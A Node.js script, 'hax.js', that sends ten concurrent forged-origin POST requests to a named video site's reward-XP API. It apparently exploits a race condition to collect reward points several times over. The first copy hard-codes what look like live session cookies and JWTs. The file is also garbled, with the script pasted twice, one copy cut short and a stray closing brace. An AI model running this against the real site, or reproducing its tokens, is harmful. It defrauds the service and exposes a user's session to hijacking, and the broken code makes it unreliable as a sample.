// Usage: node hax.js

// 1. CONFIGURATION
const ENDPOINT = 'https://www.boostervideos.net/api/trpc/xp.rewardXp'; 
const CONCURRENT_REQUESTS = 10; 

// IMPORTANT: Paste a fresh cookie from https://www.boostervideos.net here
const AUTH_COOKIE = "__clerk_db_jwt_DZWCMe2A=dvb_34NxbQLwBfJifZn9yvnb9kTeeOs; __refresh_DZWCMe2A=HB9bnBpNCj5m6aHAj6JE; __client_uat_DZWCMe2A=1763724065; __session_DZWCMe2A=eyJhbGciOiJSUzI1NiIsImNhdCI6ImNsX0I3ZDRQRDExMUFBQSIsImtpZCI6Imluc18zMjlKa0RWSGVrNVQwOXFWamxORlY5Z1RmUkkiLCJ0eXAiOiJKV1QifQ.eyJhenAiOiJodHRwczovL3d3dy5ib29zdGVydmlkZW9zLm5ldCIsImV4cCI6MTc2NDE4NTgxOSwiZnZhIjpbNzY5NCwtMV0sImlhdCI6MTc2NDE4NTc1OSwiaXNzIjoiaHR0cHM6Ly9tYWpvci10b3J0b2lzZS0zMC5jbGVyay5hY2NvdW50cy5kZXYiLCJuYmYiOjE3NjQxODU3NDksInNpZCI6InNlc3NfMzVtbk1MMUdLVHQ3NlIyNTNidXU3WjRtRE11Iiwic3RzIjoiYWN0aXZlIiwic3ViIjoidXNlcl8zNDh5MGVVQjhMS1pwSUE1cjZ4MFlLdHBpaXciLCJ2IjoyfQ.PTo97xAU5pe-DV3XOAlDFr6WqsfJ1kNgQIQv7jRyyFtTvocs4DKwWw3TEiN3AzMWshCyb_DUI228BzYlh7Tpaaz9yGYjdvTNzrbZsH8Kl4_VkzhoDpj3VruFzc2hEC0PCE83LNbQ9rcTJJutMrcBFHdtXClDxo5Dpgj7C2ng6_qrQyMTjHCpaA4ZP6GjTKBY_rhVT9WttHqMucPz3ujb7QtV3iZP5FCKSQz9eWlWMp07jmDKiSdoBd-wQupnKUt-Esj4oIboCBKDfmzJZNq9O2Y1qe_K4Tx1LLl37UPxRAFEK_5x76LxCYE4Ga7QyHkHTtZe4vVossTQWuSg--BHHA; booster-guest=true; sidebar_state=false; __client_uat=1767626062; __refresh_1AWSo9IW=njNPv1iXufqnBFAHVvg1; __client_uat_1AWSo9IW=1767626062; clerk_active_context=sess_37qMHql4BakR0ocankygLeGRBII:; __session=eyJhbGciOiJSUzI1NiIsImNhdCI6ImNsX0I3ZDRQRDExMUFBQSIsImtpZCI6Imluc18zNk9MOGZPcGVEbmU5aEVRVlU3eUNvcm1HVW8iLCJ0eXAiOiJKV1QifQ.eyJhenAiOiJodHRwczovL3d3dy5ib29zdGVydmlkZW9zLm5ldCIsImV4cCI6MTc2NzYzMjUxNCwiZnZhIjpbMTA2LC0xXSwiaWF0IjoxNzY3NjMyNDU0LCJpc3MiOiJodHRwczovL2NsZXJrLmJvb3N0ZXJ2aWRlb3MubmV0IiwibmJmIjoxNzY3NjMyNDQ0LCJzaWQiOiJzZXNzXzM3cU1IcWw0QmFrUjBvY2Fua3lnTGVHUkJJSSIsInN0cyI6ImFjdGl2ZSIsInN1YiI6InVzZXJfMzZPVmRLTEhPZURPaVVPaU5nNE96ODMwZk9VIiwidiI6Mn0.po44TkPpe-AZPHQheeHDZdP3Bx-IVVzWFwmHMkbZ4kdd4eS1FKo1AiU6tnkxy-G8Gmehu2DNXrw61UkXwyKofAkhs5W-Y6MDECeDg5f1WHIs8nyJfo_5gWy6bqYSpOPunI1lw1JmGSTAhCSKOT9nYnQ_9ehoCaYetHicED4ysxrATvSVWpq3WqKyPBrWQzCX6BTG8UGDzWWLd4lVR8en3IwnZuuSB70KgZCuyqBQatS6Zqu8Ffwjr6nsmDNzZg4ymosJLNco3Ag8jy-_W0MtHeI4WAm76VWjohsIJ50evwXnCrgpNODdZEhRz4dpyB1z1vJF9Ywaw3ps5bayCKkmqA; __session_1AWSo9IW=eyJhbGciOiJSUzI1NiIsImNhdCI6ImNsX0I3ZDRQRDExMUFBQSIsImtpZCI6Imluc18zNk9MOGZPcGVEbmU5aEVRVlU3eUNvcm1HVW8iLCJ0eXAiOiJKV1QifQ.eyJhenAiOiJodHRwczovL3d3dy5ib29zdGVydmlkZW9zLm5ldCIsImV4cCI6MTc2NzYzMjUxNCwiZnZhIjpbMTA2LC0xXSwiaWF0IjoxNzY3NjMyNDU0LCJpc3MiOiJodHRwczovL2NsZXJrLmJvb3N0ZXJ2aWRlb3MubmV0IiwibmJmIjoxNzY3NjMyNDQ0LCJzaWQiOiJzZXNzXzM3cU1IcWw0QmFrUjBvY2Fua3lnTGVHUkJJSSIsInN0cyI6ImFjdGl2ZSIsInN1YiI6InVzZXJfMzZPVmRLTEhPZURPaVVPaU5nNE96ODMwZk9VIiwidiI6Mn0.po44TkPpe-AZPHQheeHDZdP3Bx-IVVzWFwmHMkbZ4kdd4eS1FKo1AiU6tnkxy-G8Gmehu2DNXrw61UkXwyKofAkhs5W-Y6MDECeDg5f1WHIs8nyJfo_5gWy6bqYSpOPunI1lw1JmGSTAhCSKOT9nYnQ_9ehoCaYetHicED4ysxrATvSVWpq3WqKyPBrWQzCX6BTG8UGDzWWLd4lVR8en3IwnZuuSB70KgZCuyqBQatS6Zqu8Ffwjr6nsmDNzZg4ymosJLNco3Ag8jy-_W0MtHeI4WAm76VWjohsIJ50evwXnCrgpNODdZEhRz4dpyB1z1vJF9Ywaw3ps5bayCKkmqA";

async function runTest() {
    console.log(`Starting concurrency test with ${CONCURRENT_REQUESTS} requests...`);

    // 2. PREPARE REQUESTS
    const requests = Array.from({ length: CONCURRENT_REQUESTS }).map(async (_, index) => {
        try {
            const response = await fetch(ENDPOINT, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'Cookie': AUTH_COOKIE,
                    // REQUIRED for Production: Mimic the origin of the request
                    'Origin': 'https://www.boostervideos.net',
                    'Referer': 'https://www.boostervideos.net/',
                    'x-trpc-source': 'client'
                },
                body: JSON.stringify({ 
                    json: {
                        amount: 10,
                        videoId: "c6b8b5ea-1d5b-4dff-8189-754f87b1b6a1",
                    }
                }) 
            });

            const data = await response.json();
            return { index, status: response.status, data };
        } catch (error) {
            return { index, status: 'ERROR', error: error.message };
        }
    });

    // 3. FIRE ALL REQUESTS SIMULTANEOUSLY
    const results = await Promise.all(requests);

    // 4. ANALYZE RESULTS
    const successes = results.filter(r => r.status === 200);
    const failures = results.filter(r => r.status !== 200);

    console.log('--- Test Complete ---');
    console.log(`Total Requests: ${CONCURRENT_REQUESTS}`);
    console.log(`Successes: ${successes.length}`);
    console.log(`Failures: ${failures.length}`);
    
    if (successes.length > 0) console.log('Sample Success:', JSON.stringify(successes[0], null, 2));
    if (failures.length > 0) console.log('Sample Failure:', JSON.stringify(failures[0], null, 2));
// filepath: hax.js
// Usage: node hax.js

// 1. CONFIGURATION
const ENDPOINT = 'https://www.boostervideos.net/api/trpc/xp.rewardXp'; 
const CONCURRENT_REQUESTS = 10; 

// IMPORTANT: Paste a fresh cookie from https://www.boostervideos.net here
const AUTH_COOKIE = "PASTE_YOUR_PRODUCTION_COOKIE_HERE";

async function runTest() {
    console.log(`Starting concurrency test with ${CONCURRENT_REQUESTS} requests...`);

    // 2. PREPARE REQUESTS
    const requests = Array.from({ length: CONCURRENT_REQUESTS }).map(async (_, index) => {
        try {
            const response = await fetch(ENDPOINT, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'Cookie': AUTH_COOKIE,
                    // REQUIRED for Production: Mimic the origin of the request
                    'Origin': 'https://www.boostervideos.net',
                    'Referer': 'https://www.boostervideos.net/',
                    'x-trpc-source': 'client'
                },
                body: JSON.stringify({ 
                    json: {
                        amount: 10,
                        videoId: "c6b8b5ea-1d5b-4dff-8189-754f87b1b6a1",
                    }
                }) 
            });

            const data = await response.json();
            return { index, status: response.status, data };
        } catch (error) {
            return { index, status: 'ERROR', error: error.message };
        }
    });

    // 3. FIRE ALL REQUESTS SIMULTANEOUSLY
    const results = await Promise.all(requests);

    // 4. ANALYZE RESULTS
    const successes = results.filter(r => r.status === 200);
    const failures = results.filter(r => r.status !== 200);

    console.log('--- Test Complete ---');
    console.log(`Total Requests: ${CONCURRENT_REQUESTS}`);
    console.log(`Successes: ${successes.length}`);
    console.log(`Failures: ${failures.length}`);
    
    if (successes.length > 0) console.log('Sample Success:', JSON.stringify(successes[0], null, 2));
    if (failures.length > 0) console.log('Sample Failure:', JSON.stringify(failures[0], null, 2));
}
}

runTest();